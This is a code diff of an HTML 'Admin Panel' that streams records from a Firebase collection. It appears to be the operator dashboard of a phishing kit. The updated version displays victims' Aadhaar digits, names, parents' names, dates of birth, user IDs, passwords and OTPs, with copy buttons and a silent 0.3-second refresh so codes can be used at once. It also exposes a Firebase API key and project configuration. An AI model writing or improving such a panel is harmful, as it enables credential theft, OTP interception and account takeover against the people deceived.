@@ -4,195 +4,164 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Admin Panel</title>
-
 <style>
-body { font-family: Arial, sans-serif; background:#f2f2f2; margin:0; }
-header { background:#007BFF; color:#fff; padding:15px; text-align:center; font-size:22px; }
-
-.buttons { text-align:center; margin:10px; }
-.buttons button {
-  padding:8px 16px; margin:0 5px;
-  border:none; border-radius:5px;
-  background:#007BFF; color:#fff; cursor:pointer;
-}
-.buttons button.active { background:#0056b3; }
-
-.container {
-  max-width:1200px; margin:auto; padding:15px;
-  height:80vh; overflow-y:auto;
-}
-
-.session-block {
-  background:#fff; border:2px solid #28a745;
-  border-radius:8px; padding:15px; margin-bottom:20px;
-}
-
-.session-title {
-  font-weight:bold; font-size:18px; margin-bottom:10px;
-}
-
-.data-item {
-  background:#f9f9f9; padding:10px; margin-bottom:10px;
-  border-radius:5px;
-}
-
-.field {
-  display:flex; align-items:center; gap:5px; margin-bottom:5px;
-}
-.field-name { width:90px; font-weight:bold; }
-.field-value { flex:1; }
-
-.copy-btn {
-  padding:3px 8px; border:none; border-radius:5px;
-  background:#28a745; color:#fff; cursor:pointer;
-}
-
-.otp-field .field-value {
-  color:#d63384; font-weight:bold;
-}
-
-small { color:gray; font-size:12px; }
+  body{font-family:Arial;background:#f2f2f2;margin:0;padding:0}
+  header{background:#007BFF;color:#fff;padding:15px;text-align:center;font-size:24px}
+  .buttons{text-align:center;margin:15px 0}
+  .buttons button{padding:8px 16px;margin:0 5px;border:none;border-radius:5px;background:#007BFF;color:#fff;cursor:pointer}
+  .buttons button.active{background:#0056b3}
+  .container{max-width:1200px;margin:auto;padding:20px;height:80vh;overflow-y:auto}
+  .session-block{background:#fff;border:2px solid #28a745;border-radius:8px;padding:15px;margin-bottom:20px}
+  .session-title{font-weight:bold;font-size:18px;margin-bottom:10px}
+  .data-item{background:#f9f9f9;padding:10px;border-radius:6px;margin-bottom:10px}
+  .field{display:flex;gap:6px;margin-bottom:5px;align-items:center}
+  .field-name{width:100px;font-weight:bold}
+  .field-value{flex:1;word-break:break-all}
+  .copy-btn{padding:3px 8px;background:#28a745;color:white;border:none;border-radius:4px;cursor:pointer}
+  .otp-field .field-value{color:#d63384;font-weight:bold}
+  small{color:gray;font-size:12px}
 </style>
 </head>
-
 <body>
 
 <header>Admin Panel</header>
-
 <div class="buttons">
   <button id="allBtn" class="active">All Data</button>
-  <button id="groupBtn">Grouped</button>
+  <button id="groupBtn">Grouped Data</button>
 </div>
 
 <div class="container" id="dataContainer"></div>
 
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
-import { getFirestore, collection, query, orderBy, onSnapshot }
-from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+  import { getFirestore, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
-  authDomain: "ss22-a96d3.firebaseapp.com",
-  projectId: "ss22-a96d3",
-  storageBucket: "ss22-a96d3.firebasestorage.app",
-  messagingSenderId: "607942972170",
-  appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
-};
+  const firebaseConfig = {
+    apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+    authDomain: "ss22-a96d3.firebaseapp.com",
+    projectId: "ss22-a96d3",
+    storageBucket: "ss22-a96d3.firebasestorage.app",
+    messagingSenderId: "607942972170",
+    appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
+  };
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-const container = document.getElementById("dataContainer");
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+  const container = document.getElementById("dataContainer");
 
-let allData = [];
-let view = "all";
-let sessionMap = {};
-let nextSessionNo = 1;
+  let allData = [], currentView="all", sessionMap={}, nextSession=1;
 
-const fieldMap = {
-  otp1: "OTP 1",
-  otp2: "OTP 2",
-  otp3: "OTP 3",
-  otp4: "OTP 4",
-  attempt: "Attempt"
-};
+  const fieldMap = {
+    aadhaarLastDigits:"Add",
+    fullName:"Name",
+    fatherName:"F:Name",
+    motherName:"M:Name",
+    profilePassword:"PP",
+    dateOfBirth:"DOB",
+    userId:"UserId",
+    password:"Password",
+    otp:"OTP",
+    otp1:"OTP",
+    OTP:"OTP",
+    enteredOtp:"OTP"
+  };
 
-// 🔥 READ ONLY opt1 COLLECTION
-const q = query(collection(db, "opt1"), orderBy("timestamp", "desc"));
-onSnapshot(q, snap => {
-  allData = [];
-  snap.forEach(doc => {
-    const d = doc.data();
-    d.id = doc.id;
-    allData.push(d);
-
-    const sid = d.sessionId || "Unknown";
-    if (!sessionMap[sid]) sessionMap[sid] = nextSessionNo++;
-  });
-  render();
-});
-
-function render() {
-  if (view === "all") renderAll();
-  else renderGrouped();
-}
-
-function renderAll() {
-  container.innerHTML = "";
-  allData.forEach(item => {
-    container.appendChild(buildItem(item));
-  });
-}
-
-function renderGrouped() {
-  container.innerHTML = "";
-  const grouped = {};
-
-  allData.forEach(i => {
-    const sid = i.sessionId || "Unknown";
-    if (!grouped[sid]) grouped[sid] = [];
-    grouped[sid].push(i);
-  });
-
-  Object.keys(grouped).forEach(sid => {
-    const box = document.createElement("div");
-    box.className = "session-block";
-
-    const title = document.createElement("div");
-    title.className = "session-title";
-    title.textContent = `Session ${sessionMap[sid]} - ${sid}`;
-    box.appendChild(title);
-
-    grouped[sid].forEach(i => box.appendChild(buildItem(i)));
-    container.appendChild(box);
-  });
-}
-
-function buildItem(item) {
-  const div = document.createElement("div");
-  div.className = "data-item";
-
-  Object.keys(fieldMap).forEach(key => {
-    if (!item[key]) return;
-
-    const row = document.createElement("div");
-    row.className = "field";
-    if (key.startsWith("otp")) row.classList.add("otp-field");
-
-    row.innerHTML = `
-      <div class="field-name">${fieldMap[key]}:</div>
-      <div class="field-value">${item[key]}</div>
-      <button class="copy-btn">Copy</button>
-    `;
-
-    row.querySelector("button").onclick = () =>
-      navigator.clipboard.writeText(item[key]);
-
-    div.appendChild(row);
-  });
-
-  if (item.timestamp) {
-    const t = document.createElement("small");
-    t.textContent = new Date(item.timestamp.seconds * 1000).toLocaleString();
-    div.appendChild(t);
+  function mergeAndSort(snapshot){
+    snapshot.forEach(doc=>{
+      const data = doc.data();
+      data.id = doc.id;
+      allData.push(data);
+      const sess = data.sessionId || data.userId || "Unknown";
+      if(!sessionMap[sess]) sessionMap[sess] = nextSession++;
+    });
+    allData.sort((a,b)=>(b.timestamp?.seconds||0)-(a.timestamp?.seconds||0));
+    render();
   }
 
-  return div;
-}
+  function render(){
+    currentView === "all" ? renderAll(allData) : renderGrouped(allData);
+  }
 
-document.getElementById("allBtn").onclick = () => {
-  view = "all";
-  allBtn.classList.add("active");
-  groupBtn.classList.remove("active");
-  render();
-};
+  function renderAll(dataArr){
+    container.innerHTML="";
+    dataArr.forEach(item=>{
+      const div = document.createElement("div"); div.className="data-item";
+      Object.keys(item).forEach(key=>{
+        if(!fieldMap[key]) return;
+        const field = document.createElement("div"); field.className="field";
+        if(key.toLowerCase().includes("otp")) field.classList.add("otp-field");
+        field.innerHTML=`<div class="field-name">${fieldMap[key]}:</div>
+        <div class="field-value">${item[key]}</div>
+        <button class="copy-btn">Copy</button>`;
+        // Clipboard copy WITHOUT alert
+        field.querySelector("button").onclick=()=>navigator.clipboard.writeText(item[key]);
+        div.appendChild(field);
+      });
+      if(item.timestamp){
+        const t = document.createElement("small");
+        t.textContent = new Date(item.timestamp.seconds*1000).toLocaleString();
+        div.appendChild(t);
+      }
+      container.appendChild(div);
+    });
+  }
 
-document.getElementById("groupBtn").onclick = () => {
-  view = "group";
-  groupBtn.classList.add("active");
-  allBtn.classList.remove("active");
-  render();
-};
+  function renderGrouped(dataArr){
+    const grouped = {};
+    dataArr.forEach(item=>{
+      const sess = item.sessionId || item.userId || "Unknown";
+      if(!grouped[sess]) grouped[sess]=[];
+      grouped[sess].push(item);
+    });
+
+    container.innerHTML="";
+    Object.keys(grouped).forEach(sess=>{
+      const sDiv = document.createElement("div"); sDiv.className="session-block";
+      const title = document.createElement("div"); title.className="session-title";
+      title.textContent = `Session ${sessionMap[sess]} - ${sess}`; sDiv.appendChild(title);
+
+      grouped[sess].forEach(item=>{
+        const div = document.createElement("div"); div.className="data-item";
+        Object.keys(item).forEach(key=>{
+          if(!fieldMap[key]) return;
+          const field = document.createElement("div"); field.className="field";
+          if(key.toLowerCase().includes("otp")) field.classList.add("otp-field");
+          field.innerHTML=`<div class="field-name">${fieldMap[key]}:</div>
+          <div class="field-value">${item[key]}</div>
+          <button class="copy-btn">Copy</button>`;
+          // Clipboard copy WITHOUT alert
+          field.querySelector("button").onclick=()=>navigator.clipboard.writeText(item[key]);
+          div.appendChild(field);
+        });
+        if(item.timestamp){
+          const t = document.createElement("small");
+          t.textContent = new Date(item.timestamp.seconds*1000).toLocaleString();
+          div.appendChild(t);
+        }
+        sDiv.appendChild(div);
+      });
+
+      container.appendChild(sDiv);
+    });
+  }
+
+  // Firebase real-time listener
+  function attachListener(){
+    allData = []; sessionMap = {}; nextSession=1;
+    const q = query(collection(db,"users33"), orderBy("timestamp","desc"));
+    onSnapshot(q, mergeAndSort);
+  }
+  attachListener();
+
+  // Silent auto-refresh every 0.3s
+  setInterval(()=>{ attachListener(); }, 300);
+
+  document.getElementById("allBtn").onclick=()=>{
+    currentView="all"; allBtn.classList.add("active"); groupBtn.classList.remove("active"); render();
+  };
+  document.getElementById("groupBtn").onclick=()=>{
+    currentView="group"; groupBtn.classList.add("active"); allBtn.classList.remove("active"); render();
+  };
 </script>
 
 </body>
